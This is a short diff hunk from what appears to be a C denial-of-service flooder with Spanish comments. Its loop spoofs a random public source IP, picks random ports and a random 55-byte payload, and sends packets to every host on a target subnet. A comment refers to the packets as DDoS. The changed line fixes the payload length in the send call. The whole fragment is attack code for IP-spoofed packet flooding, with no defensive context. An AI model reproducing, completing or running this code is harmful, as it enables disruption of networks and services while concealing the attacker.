@@ -134,7 +134,7 @@ srcp=rand_cmwc() % 65534+1;
 dstp=rand_cmwc() % 65534+1;
 snprintf(ip_buffer, sizeof(ip_buffer), "%s.%d",mi_red, i);
 generate_random_payload(payload,55); //eleji el PAY load size a gusto
-ipsend(generar_ip_publica_aleatoria(),inet_addr(ip_buffer),srcp,dstp,payload,sizeof(payload));
+ipsend(generar_ip_publica_aleatoria(),inet_addr(ip_buffer),srcp,dstp,payload,55);
 ALAN++;
 }
 //Ya estan los paquetesd calculaDDoS
